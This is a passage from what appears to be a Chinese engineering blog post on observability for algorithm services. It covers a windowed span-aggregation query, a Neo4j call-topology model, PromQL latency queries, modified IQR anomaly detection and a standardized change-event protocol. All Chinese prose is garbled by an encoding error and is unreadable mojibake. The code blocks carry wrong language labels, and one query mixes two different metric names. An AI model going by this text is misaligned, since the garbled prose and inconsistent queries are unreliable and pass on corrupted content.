Â  Â  Â  Â <span class="hljs-built_in">max</span>(duration) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ timerMax,
Â  Â  Â  Â <span class="hljs-built_in">sum</span>(duration) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â asÂ timerSum,
Â  Â  Â  Â <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>) Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â asÂ timerCount,
Â  Â  Â  Â <span class="hljs-built_in">sampling</span>(new Object[]{duration,traceId}) Â  Â  Â  Â  Â  Â  Â  Â  Â Â asÂ sampling
FROM algoRedisSpanÂ asÂ origin
GROUP BY algoScene, rootScene, currentScene, props,env,serviceName, clusterName, redisUrl,statusCode,<span class="hljs-built_in">trunc_sec</span>(startTime,Â <span class="hljs-number">10</span>)
</code></pre>
<ul>
<li>@TimeWindow(10):Â å®šä¹‰äº†ä¸€ä¸ª10ç§’çš„æ»šåŠ¨çª—å£ï¼Œå¼•æ“ä¼šæŠŠè¿™10ç§’å†…äº§ç”Ÿçš„æ‰€Redisè®¿é—®è®°å½•ï¼ˆSpanï¼‰æ”’åœ¨ä¸€èµ·è¿›è¡Œä¸€æ¬¡è®¡ç®—</li>
<li>@Metric(...):Â è¿™å®šä¹‰äº†è¾“å‡ºç»“æœçš„ç»“æ„ã€‚å°†è®¡ç®—ç»“æœè½¬åŒ–ä¸ºæŒ‡æ ‡ï¼ˆMetricï¼‰ï¼Œå…¶ä¸­tagsæ˜¯ç»´åº¦ï¼Œfieldsæ˜¯æ•°å€¼ã€‚</li>
<li>sampling(...):Â é‡‡æ ·åŠŸèƒ½ï¼Œé€šè¿‡é‡‡æ ·é€»è¾‘è®°å½•è€—æ—¶æœ€å¤§çš„traceIdã€‚</li>
</ul>
<p><strong>åœºæ™¯æ‹“æ‰‘å›¾</strong></p>
<p>å‰é¢æ„é€ äº†ä»¥â€œåœºæ™¯â€ä¸ºä¸­å¿ƒçš„ç®—æ³•åŸŸè°ƒç”¨æŒ‡æ ‡ï¼Œåé¢æ„é€ æ€æ ·çš„æ•°æ®æ¨¡å‹å†³å®šäº†ç”¨æˆ·ä»ä»€ä¹ˆè§’åº¦å»è§‚å¯Ÿå’Œåˆ†ææ•°æ®ã€‚æˆ‘ä»¬æ‘’å¼ƒäº†ä¸å¤Ÿç›´è§‚çš„ä¼ ç»Ÿçš„è¡¨æ ¼å¼å±•ç¤ºï¼Œå€ŸåŠ©å¼ºå¤§çš„å›¾æ•°æ®å­˜å‚¨æ•°æ®åº“Neo4jï¼Œå®æ—¶å­˜å‚¨å’Œæ›´æ–°ç®—æ³•åœºæ™¯çš„ç®—å­è°ƒç”¨æ‹“æ‰‘å›¾ã€‚å®æ—¶è°ƒç”¨æŒ‡æ ‡å…³ç³»å­˜å‚¨æ—¶åºæ•°æ®åº“Victoriametricsï¼Œå®æ—¶è°ƒç”¨å…³ç³»å­˜å‚¨Neo4jã€‚</p>
<p>å›¾æ¨¡å‹</p>
<ul>
<li>èŠ‚ç‚¹(Node)ï¼šä»£è¡¨å®ä½“ï¼Œå¦‚ï¼šAppã€AppClusterã€ArkGroupã€ArkDataIdã€AlgoComponentã€AlgoDGraphç­‰</li>
<li>å…³ç³»(Relationship)ï¼šè¿æ¥èŠ‚ç‚¹ï¼Œå¦‚ï¼šSceneRelationã€AppRelationç­‰</li>
<li>å±æ€§(Properties)ï¼šå­˜å‚¨åœ¨èŠ‚ç‚¹å’Œå…³ç³»ä¸Šçš„é”®å€¼å¯¹ï¼Œå¦‚ï¼šappNameã€clusterNameã€sceneã€componentNameã€updateTimestampç­‰</li>
</ul>
<p>æ•°æ®æ¨¡å‹è®¾è®¡</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// appèŠ‚ç‚¹</span>
<span class="hljs-title function_ invoke__">CREATEÂ </span>(<span class="hljs-attr">a</span>:App {
Â  <span class="hljs-attr">Â Â id</span>:Â <span class="hljs-number">1</span>,
Â  <span class="hljs-attr">Â Â hash</span>: -<span class="hljs-number">6545781662466553124</span>,
Â  <span class="hljs-attr">Â Â appName</span>:Â <span class="hljs-string">"sextant"</span>
})
<span class="hljs-comment">// appClusterèŠ‚ç‚¹</span>
<span class="hljs-title function_ invoke__">CREATEÂ </span>(<span class="hljs-attr">c</span>:AppCluster {
Â  <span class="hljs-attr">Â Â id</span>:Â <span class="hljs-number">23</span>,
Â  <span class="hljs-attr">Â Â hash</span>: -<span class="hljs-number">8144086133777820909</span>,
Â  <span class="hljs-attr">Â Â appName</span>:Â <span class="hljs-string">"sextant"</span>,
Â  <span class="hljs-attr">Â Â clusterName</span>:Â <span class="hljs-string">"sextant-csprd-01"</span>
})
<span class="hljs-comment">// index</span>
CREATE INDEX <span class="hljs-title function_ invoke__">index_app_nameÂ FORÂ </span>(<span class="hljs-attr">a</span>:App)Â <span class="hljs-title function_ invoke__">ONÂ </span>(a.appName)
<span class="hljs-comment">// å…³ç³»</span>
<span class="hljs-title function_ invoke__">MATCHÂ </span>(<span class="hljs-attr">a</span>:App {<span class="hljs-attr">id</span>:Â <span class="hljs-number">1</span>}),(c:AppCluster {id:<span class="hljs-number">23</span>})
<span class="hljs-title function_ invoke__">MERGEÂ </span>(a)-[r:HAS_CLUSTER]-&gt;(c)
ON CREATE SET r.updateTs =Â <span class="hljs-title function_ invoke__">timestamp</span>()
ON MATCH SET r.updateTs =Â <span class="hljs-title function_ invoke__">timestamp</span>()
<span class="hljs-keyword">return</span>Â r;
</code></pre>
<p>æ—¶åºæŒ‡æ ‡è®¾è®¡</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â  Â Â <span class="hljs-attr">"metric"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-punctuation">{</span>Â  Â  Â  Â  Â  Â  Â  Â  Â 
Â  Â  Â  Â Â <span class="hljs-attr">"__name__"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"algo_client_metric_timerCount"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"from"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"hashcodexxx"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"to"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"hashcodexxx"</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"statusCode"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>
Â  Â  Â  Â Â <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"Dgraph"</span>
Â  Â Â <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"values"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">42</span><span class="hljs-punctuation">,</span><span class="hljs-number">32</span><span class="hljs-punctuation">,</span><span class="hljs-number">15</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
Â  Â Â <span class="hljs-attr">"timestamps"</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-number">1767573600</span><span class="hljs-punctuation">,</span><span class="hljs-number">1767573620</span><span class="hljs-punctuation">,</span><span class="hljs-number">1767573640</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>ä¸Šçº¿æ•ˆæœ</strong></p>
<ul>
<li>é€šè¿‡apocè·å–å®ä½“é—´çš„è°ƒç”¨å…³ç³»</li>
</ul>

<pre><code class="hljs language-objectivec" lang="objectivec"><span class="hljs-built_in">CALL</span>Â apoc.meta.graph()
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f10734a5454243baa6c9dd65f797fc11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=6g73x0FpDg6XCd0BRyjy8MkrRd8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>é€šè¿‡cypherè¯­å¥æŸ¥è¯¢æŸåœºæ™¯ä¸‹çš„è°ƒç”¨æ‹“æ‰‘</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">MATCHÂ 
Â  Â  <span class="hljs-selector-tag">p</span> = (entry {appName:Â 'app'})-<span class="hljs-selector-attr">[r:USES_SCENE*1..]</span>-&gt;(to)Â 
WHEREÂ <span class="hljs-attribute">all</span>(relÂ INÂ rÂ WHEREÂ rel.type =Â 'CURRENT_SCENE'Â AND rel.scene CONTAINSÂ 'scene'Â  Â  Â  Â  Â  and rel.updateTs &gt;=Â <span class="hljs-number">1767675780000</span>Â and rel.updateTs &lt;=Â <span class="hljs-number">1767679380000</span>)Â 
RETURNÂ <span class="hljs-built_in">nodes</span>(p) AS allNodes, <span class="hljs-built_in">relationships</span>(p) AS allRels LIMITÂ <span class="hljs-number">1000</span>
</code></pre>

<pre><code class="hljs language-ini" lang="ini">sum(sum_over_time(algo_client_metric_timerSum{<span class="hljs-attr">scene</span>=<span class="hljs-string">"xxx"</span>}[<span class="hljs-number">1</span>m] <span class="hljs-literal">off</span>set <span class="hljs-number">1</span>m)) by (to) /Â sum(sum_over_time(otel_algo_client_metric_timerCount{scene=<span class="hljs-string">"xxx"</span>}[<span class="hljs-number">1</span>m] <span class="hljs-literal">off</span>set <span class="hljs-number">1</span>m)) by (to)Â 
/ 1000
sum(sum_over_time(algo_client_metric_timerCount{<span class="hljs-attr">scene</span>=<span class="hljs-string">"xxx"</span>}[<span class="hljs-number">1</span>m] <span class="hljs-literal">off</span>set <span class="hljs-number">1</span>m) / <span class="hljs-number">60</span>) by (to)
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa81efea82b247abb1396e470380c2bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=5ADvlMG2rtLV81Tg%2B0LrVK5coJs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-8">äº”ã€æ™ºèƒ½åŒ–æ¼”è¿›ï¼šå¼‚å¸¸æ£€æµ‹ä¸äº‹ä»¶è”åŠ¨</h2>
<h3 data-id="heading-9">å¼‚å¸¸æ£€æµ‹ï¼šæ”¹è¿›å‹IQRç®—æ³•</h3>
<p>é€šè¿‡æ„å»ºä»¥â€œåœºæ™¯â€ä¸ºæ ¸å¿ƒçš„ç›‘æ§ç»´åº¦ï¼Œæˆ‘ä»¬å¯ä»¥ç²¾å‡†æ•æ‰å¼‚å¸¸æ€»æ•°åŠå…¶æ¼”è¿›è¶‹åŠ¿ã€‚æ¥ä¸‹æ¥èšç„¦<strong>å‘¨æœŸæ€§è§„å¾‹è¯†åˆ«ä¸å¼‚å¸¸æ£€æµ‹ç®—æ³•ä¼˜åŒ–</strong>ä¸¤å¤§æ ¸å¿ƒé¢†åŸŸï¼š</p>
<p><strong>å‘¨æœŸæ€§è§„å¾‹ï¼šä»å‚…é‡Œå¶å˜æ¢åˆ°è‡ªé€‚åº”è¯†åˆ«</strong></p>
<p>åœ¨ç”µå•†å¾®æœåŠ¡æ¶æ„ä¸­ï¼ŒæŒ‡æ ‡æ³¢åŠ¨æ·±åº¦è€¦åˆäººç±»è¡Œä¸ºçš„â€œæ˜¼å¤œèŠ‚å¾‹â€ï¼›è€Œåœ¨ç®—æ³•ä¸šåŠ¡åœºæ™¯ä¸‹ï¼Œé¢‘ç¹çš„å®éªŒä»»åŠ¡ä½¿å‘¨æœŸæ€§ç‰¹å¾æ›´è¶‹å¤æ‚ä¸”å¤šå˜ï¼›</p>
<ul>
<li>é€šç”¨æ–¹æ¡ˆï¼šä¼ ç»Ÿçš„å‚…é‡Œå¶å˜æ¢ï¼ˆFFTï¼‰è™½èƒ½æ•æ‰é¢‘åŸŸç‰¹å¾ï¼Œä½†åœ¨æ—¶åŸŸå™ªå£°å¹²æ‰°ä¸‹éš¾ä»¥æ¨å¯¼å‡ºé«˜ç²¾åº¦çš„ç‰©ç†å‘¨æœŸï¼›</li>
<li>è½åœ°æ–¹æ¡ˆï¼šé‡‡ç”¨<strong>è‡ªé€‚åº”å‘¨æœŸè¯†åˆ«ç®—æ³•ï¼Œ</strong> èƒ½å¤Ÿæ ¹æ®æ—¶åºæ•°æ®çš„åŠ¨æ€æ¼”å˜ï¼Œè‡ªåŠ¨ã€ç²¾ç¡®åœ°æ¨æµ‹å‡ºå„åœºæ™¯ç‰¹æœ‰çš„å‘¨æœŸæ­¥é•¿ï¼›</li>
</ul>
<p>ç»™å®šä¸€äº›å€™é€‰å‘¨æœŸï¼Œé€šè¿‡è®¡ç®—æ—¶é—´åºåˆ—çš„æ»å1å‘¨æœŸçš„è‡ªç›¸å…³æ€§ï¼ŒéªŒè¯æ—¶é—´åºåˆ—æ˜¯å¦åŒ¹é…å€™é€‰å‘¨æœŸã€‚å¯¹ä¸åŒçš„å€™é€‰å‘¨æœŸï¼Œå–ä¸åŒé•¿åº¦çš„å†å²æ•°æ®ï¼Œå€™é€‰å‘¨æœŸè¶Šå¤§ï¼Œéœ€è¦å†å²æ•°æ®è¶Šä¹…è¿œï¼Œç›¸å…³æ€§è¦æ±‚è¾ƒä½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f52c3e097594e66bb9a7c3b78d738c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=dGL8SlEaC0qt1fLDFEv67KzvLHc%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>å‘¨æœŸè¯†åˆ«ç®—æ³•ç¤ºæ„å›¾</p>
<p><strong>å¼‚å¸¸æ£€æµ‹ç®—æ³•ï¼šä» 3-Sigma åˆ°æ”¹è¿›å‹ IQR</strong></p>
<p>é¢å¯¹æµé‡æ¿€å¢äº§ç”Ÿçš„â€œéšæœºçªåˆºâ€ä»¥åŠä½æµé‡åœºæ™¯ä¸‹çš„â€œé›¶æ°´ä½â€å¸¸æ€ï¼Œæ£€æµ‹ç®—æ³•éœ€è¦å…·å¤‡æé«˜çš„é²æ£’æ€§ã€‚</p>
<ul>
<li>é€šç”¨æ–¹æ¡ˆï¼šæ ‡å‡†<strong>3-Sigmaç®—æ³•</strong>é¢„è®¾æ•°æ®ç¬¦åˆæ­£æ€åˆ†å¸ƒï¼Œè€Œé”™è¯¯æ•°æŒ‡æ ‡å¾€å¾€å‘ˆç°<strong>æ­£åæ€ã€é«˜å³°åº¦</strong>ç‰¹å¾ï¼Œç›´æ¥åº”ç”¨ä¼šå¯¼è‡´è™šå‡å‘Šè­¦é¢‘ç¹ï¼Œäº§ç”Ÿå¤§é‡â€œå‘Šè­¦å™ªéŸ³â€ï¼›</li>
<li>è½åœ°æ–¹æ¡ˆï¼šåŸºäºå››åˆ†ä½è·ï¼ˆIQRï¼‰ç®—æ³•è¿›è¡Œæ·±åº¦æ”¹è¿›ã€‚é€šè¿‡åŠ¨æ€è°ƒæ•´æ¯”ä¾‹ç³»æ•°ä¸é˜ˆå€¼è¾¹ç•Œï¼Œå®Œç¾é€‚é…éæ­£æ€åˆ†å¸ƒçš„é”™è¯¯æ•°æŒ‡æ ‡ï¼Œåœ¨ç¡®ä¿çµæ•åº¦çš„åŒæ—¶æ˜¾è‘—é™ä½äº†è¯¯æŠ¥ç‡ï¼›</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4053b1dd14cf4258bbd434eb0f96dfc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=ZdA5BBMcNLpD%2Bc2kWO9djiAzVHs%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ç»¼åˆè€ƒè™‘ï¼Œä½¿ç”¨IQRå¼‚å¸¸æ£€æµ‹ï¼š</p>
<ul>
<li>IQRæ˜¯æŒ‡ï¼šä¸Šå››åˆ†ä½æ•°ä¸ä¸‹å››åˆ†ä½æ•°ï¼ˆ25%åˆ†ä½æ•°ï¼‰ä¹‹å·®ï¼Œå³ç®±å‹å›¾ä¸­ç®±ä½“çš„é«˜åº¦ã€‚</li>
<li>IQRå¼‚å¸¸æ£€æµ‹æ˜¯æŒ‡ï¼šè¶…è¿‡ä¸Šå››åˆ†ä½æ•°1.5å€çš„IQRï¼Œæˆ–ä½äºä¸‹å››åˆ†ä½æ•°1.5å€çš„IQRï¼Œåˆ™ä¸ºå¼‚å¸¸ã€‚</li>
</ul>
<p>ç»“åˆé”™è¯¯æ•°æŒ‡æ ‡ç‰¹å¾ï¼Œå¯¹IQRå¼‚å¸¸æ£€æµ‹è¿›è¡Œäº†ä¸€äº›æ”¹è¿›ï¼š</p>
<ul>
<li>é›¶åŸºçº¿è‡ªé€‚åº”å¤„ç†ï¼šå½“æ—¶é—´åºåˆ—å¤§é‡ä¸º0æ—¶ï¼Œè‡ªåŠ¨æ’é™¤0å€¼è®¡ç®—åŸºçº¿ï¼Œé¿å…è¯¯æŠ¥ã€‚</li>
<li>åŒé˜ˆå€¼çº¦æŸï¼šé”™è¯¯æ•°è¶…è¿‡å¤šå°‘å¿…ä¸ºå¼‚å¸¸ï¼Œè¶…è¿‡åŸºçº¿å¤šå°‘å¿…ä¸ºå¼‚å¸¸ã€‚</li>
<li>å›¾ä¸­é«˜äº®éƒ¨åˆ†ï¼ˆ75%, 25%, +1.5, -1.5 ï¼‰å‡è®¾ç½®ä¸ºå¯è°ƒå‚æ•°ï¼Œé’ˆå¯¹ä¸åŒç®—æ³•åœºæ™¯åšå¾®è°ƒã€‚</li>
</ul>
<p><strong>è½åœ°æ•ˆæœ</strong></p>
<p>ä¸€èˆ¬å¼‚å¸¸æ£€æµ‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4e9850aa98a4f21973913c79c7b30bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=VAoOknLuy9CO63WgzU1QbyvRDYg%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>é›¶åŸºæŒ‡æ ‡çš„å¼‚å¸¸æ£€æµ‹ï¼šå™ªéŸ³æ˜¾è‘—é™ä½</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c03ee4df6f66494080e98b4086ebb353~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=jcYe5tFijaqDzrOSsAzajCdHgFk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>å‘¨æœŸæ€§æŒ‡æ ‡çš„å¼‚å¸¸æ£€æµ‹ï¼šèƒ½å‘ç°å±€éƒ¨å¼‚å¸¸ç‚¹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e6e9c62a253a435db4fe36871e3b8f5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=lRcne%2F1YMQf%2FWgZnGzb6P%2FqrxZY%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-10">äº‹ä»¶æ ‡å‡†åŒ–ï¼šå› æœå…³è”çš„æœ€åä¸€å…¬é‡Œ</h3>
<p>åœ¨å¾—ç‰©ç®—æ³•ç”Ÿæ€ä¸­ï¼Œæ—¥å‡å˜æ›´æ¬¡æ•°è¾¾ä¸‡çº§ï¼Œæ¶µç›–äº†æ¨¡å‹è¿­ä»£ã€é…ç½®åˆ†å‘ã€ä»£ç éƒ¨ç½²ç­‰å¤šä¸ªç»´åº¦ã€‚<strong>äº‹ä»¶æ ‡å‡†åŒ–çš„æ ¸å¿ƒç›®æ ‡æ˜¯ï¼šè®©æ¯ä¸€æ¬¡å˜æ›´éƒ½æœ‰è¿¹å¯å¾ªï¼Œå¹¶èƒ½è‡ªåŠ¨ä¸é“¾è·¯æŠ–åŠ¨å»ºç«‹å› æœå…³è”ã€‚</strong></p>
<p><strong>ç»Ÿä¸€äº‹ä»¶åè®®</strong></p>
<p>æˆ‘ä»¬å¯¹æ¥è‡ªé…ç½®ä¸­å¿ƒã€å‘å¸ƒå¹³å°ã€ç®—æ³•å®éªŒå¹³å°ç­‰10+ä¸ªæºå¤´çš„äº‹ä»¶è¿›è¡Œäº†åè®®æ ‡å‡†åŒ–ã€‚æ¯ä¸€ä¸ªè¿›å…¥å¯è§‚æµ‹åº•åº§çš„äº‹ä»¶éƒ½å¿…é¡»å…·å¤‡ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li><strong>Source (å˜æ›´æº)ï¼š</strong> å˜æ›´çš„å¹³å°ï¼ˆé…ç½®ä¸­å¿ƒ / å‘å¸ƒå¹³å° / ABå®éªŒå¹³å° / ç‰¹å¾å¹³å° / æœºå™¨å­¦ä¹ å¹³å°ç­‰ ï¼‰</li>
<li><strong>ChangeObject (ä¸»ä½“)ï¼š</strong> å˜æ›´å¯¹è±¡ï¼ˆå¦‚ï¼šæŸä¸ªåº”ç”¨åã€æŸä¸ªé…ç½®æ–‡ä»¶ï¼‰</li>
<li><strong>ChangeStatus (çŠ¶æ€)ï¼š</strong> PENDING / APPROVED / CANCELED / FINISHED ç­‰</li>
<li><strong>StartTime(æ—¶é—´):</strong>Â å˜æ›´å¼€å§‹æ—¶é—´Â </li>
<li><strong>ChangeName (æ ‡é¢˜)ï¼š</strong> å˜æ›´ä¸»ä½“</li>
<li><strong>Severity (ç­‰çº§)ï¼š</strong> è¯„ä¼°å˜æ›´é£é™©ç­‰çº§ï¼ˆP0-P3ï¼‰</li>
<li><strong>beforeChangeContent (ä¸Šä¸€æ¬¡ç‰ˆæœ¬)ï¼š</strong> è®°å½•å˜æ›´å‰çš„å†…å®¹</li>
<li><strong>changeContent (ç‰ˆæœ¬)ï¼š</strong> è®°å½•å˜æ›´åçš„å†…å®¹</li>
<li><strong>extraInfo (é™„åŠ ä¿¡æ¯)ï¼š</strong> å¯é€‰å­—æ®µå¦‚ä¸‹ï¼š
<ul>
<li>&lt;scene: åœºæ™¯å&gt;ï¼Œ&lt;isGlobal: å…¨å±€å˜æ›´&gt;ï¼Œ&lt;isReboot: è‡ªåŠ¨å˜æ›´&gt; ...</li>
</ul>
</li>
</ul>
<p><strong>äº‹ä»¶æµ</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc9ec97f88648e892427d61aff896f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=nBvaXqV072%2FTIEvFLmCzbTEtX8U%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li>å„å¹³å°é€šè¿‡OpenAPIæ–¹å¼ä¸ŠæŠ¥åˆ°äº‹ä»¶ä¸­å¿ƒï¼Œæ•°æ®å­˜å‚¨åœ¨ESä¸­</li>
<li>ç®—æ³•åŸŸç´¯è®¡10+ä¸ªå¹³å°100+ç§å˜æ›´å…¥å£ç±»å‹ï¼Œæ¯å¤©10+ä¸‡çš„å˜æ›´äº‹ä»¶</li>
</ul>
<p><strong>åœºæ™¯äº‹ä»¶å…³è”</strong></p>
<p>ç®—æ³•ä¾§ä¸€äº›æ ¸å¿ƒçš„å¹³å°çš„äº‹ä»¶åªèƒ½ä¸²è”ä¸Šä¸šåŠ¡åŸŸï¼Œè¿™ä¸€æœŸæˆ‘ä»¬ç”¨åœ¨çº¿TraceåŸ‹ç‚¹çš„æ–¹å¼ï¼Œä¸²è”é€šäº†æ ¸å¿ƒå¹³å°ä»ä¸€/å¤šä¸ªåœºæ™¯ï¼Œæ¯”å¦‚ï¼šç¤¾åŒºæœç´¢ä¸»æœç´¢ï¼Œé€šè¿‡åœ¨çº¿Traceæ¸…æ´—åå°±å¯ä»¥å…³è”ä¸Šï¼Œæœæ¨ABå®éªŒç®¡ç†å¹³å°ã€ç´¢å¼•å¹³å°ã€æ— çŸ©æœºå™¨å­¦ä¹ å¹³å°ç­‰ç­‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5365a8481a13470f943f8020e5468f26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=xdeN9PRh8XZdueL5Sv1zWrcqwqg%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>ä¸Šçº¿æ•ˆæœ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ae68519fdad42ada7d384ab53f83991~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768460951&amp;x-signature=xysmsQdtXlRJlx3pEaWjVGdyeB8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-11">å…­ã€æ€»ç»“â€”ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§çš„ 0 åˆ° 1</h2>
<p>ç®—æ³•åŸŸå…¨æ™¯å¯è§‚æµ‹æ€§çš„æ„å»ºï¼Œä»é›¶å¼€å§‹æ‘¸ç´¢ï¼Œæˆ‘ä»¬ç»å†äº†å¤šæ¬¡æŠ€æœ¯æ–¹æ¡ˆçš„è¿­ä»£ä¸ä¿®æ­£ã€‚è¿™è®©æˆ‘ä»¬æ„è¯†åˆ°ï¼Œç›‘æ§å»ºè®¾ä¸èƒ½ä¸ç»“åˆä¸šåŠ¡åœºæ™¯ï¼Œå¦åˆ™äº§ç”Ÿçš„æ•°æ®å¾ˆéš¾åœ¨å®é™…æ’æŸ¥ä¸­å‘æŒ¥ä»·å€¼ã€‚</p>
<p>åœ¨<strong>ä¸€æœŸå»ºè®¾</strong>ä¸­ï¼Œæˆ‘ä»¬èšç„¦äºå®ç”¨æ€§ï¼Œé€šè¿‡æ•´åˆé“¾è·¯ï¼ˆTraceï¼‰ã€æŒ‡æ ‡ï¼ˆMetricï¼‰ã€æ—¥å¿—ï¼ˆLogï¼‰ä»¥åŠå˜æ›´äº‹ä»¶ï¼Œæ‰“é€šäº†ä»åŸºç¡€æ¶æ„åˆ°ä¸šåŠ¡åº”ç”¨çš„çºµå‘å…³è”ã€‚è¿™å¥—ä½“ç³»ä¸ºäºŒçº¿è¿ç»´æä¾›äº†æ¸…æ™°çš„ä¸‹é’»èƒ½åŠ›ï¼Œä½¿å¾—æ•…éšœè¾¹ç•Œçš„é”å®šæ›´åŠ å¿«é€Ÿå‡†ç¡®ã€‚</p>
<p>è¿›å…¥<strong>äºŒæœŸé˜¶æ®µ</strong>ï¼Œæˆ‘ä»¬å°†é‡ç‚¹è§£å†³å­˜é‡ç¦»çº¿å˜æ›´çš„æ¥å…¥ä»¥åŠErrLog/ä¸šåŠ¡ç çš„æ ‡å‡†åŒ–é—®é¢˜ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å°†è§‚æµ‹ç»´åº¦å»¶ä¼¸è‡³ä¸šåŠ¡æ•ˆæœæŒ‡æ ‡ï¼Œé€šè¿‡æ„å»ºé›†SLAç›‘æ§ã€äº‹ä»¶ä¸­å¿ƒä¸å¼‚å¸¸å¤§ç›˜äºä¸€ä½“çš„â€œç®—æ³•ä¸šåŠ¡åœºæ™¯NOC-SLAä¿éšœä½“ç³»â€ï¼Œå®ç°ä»â€œç³»ç»Ÿè¿è¡Œå¯è§â€åˆ°â€œä¸šåŠ¡è¿è¡Œç¨³å®šâ€çš„é—­ç¯ã€‚</p>
<h3 data-id="heading-12">å¾€æœŸå›é¡¾</h3>
<p>1.å‰ç«¯å¹³å°å¤§ä»“åº”ç”¨ç¨³å®šæ€§æ²»ç†ä¹‹è·¯ï½œå¾—ç‰©æŠ€æœ¯</p>
